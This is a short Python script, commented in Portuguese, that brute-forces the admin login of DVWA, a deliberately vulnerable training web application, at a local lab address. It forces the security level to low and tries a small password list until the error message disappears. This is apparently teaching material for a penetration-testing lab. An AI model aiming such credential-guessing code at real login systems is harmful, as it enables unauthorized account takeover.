import requests

# 1. Configurações Iniciais
url = "http://192.168.100.165/vulnerabilities/brute/"
username = "admin"

# Injetamos o cookie de sessão e forçamos o nível de segurança para baixo
cookies = {
    "PHPSESSID": "3h59gf4nbaitdp3ogdgo2pma63", 
    "security": "low"
}

# 2. Nossa Wordlist (Lista de senhas para testar)
passwords = ["123456", "admin123", "qwerty", "password", "letmein"]

print(f"[*] Iniciando ataque de Força Bruta contra o usuário: {username}...\n")

# 3. O Loop de Ataque
for pwd in passwords:
    # O DVWA no nível Low recebe os dados via método GET na URL
    params = {
        "username": username,
        "password": pwd,
        "Login": "Login"
    }
    
    # Disparamos a requisição
    response = requests.get(url, params=params, cookies=cookies)
    
    # 4. Análise da Resposta
    # Se a mensagem de erro padrão NÃO estiver no HTML da resposta, a senha está correta!
    if "Username and/or password incorrect." not in response.text:
        print(f"[+] SUCESSO! A senha foi encontrada: {pwd}")
        break
    else:
        print(f"[-] Tentativa falhou com a senha: {pwd}")

print("\n[*] Ataque finalizado.")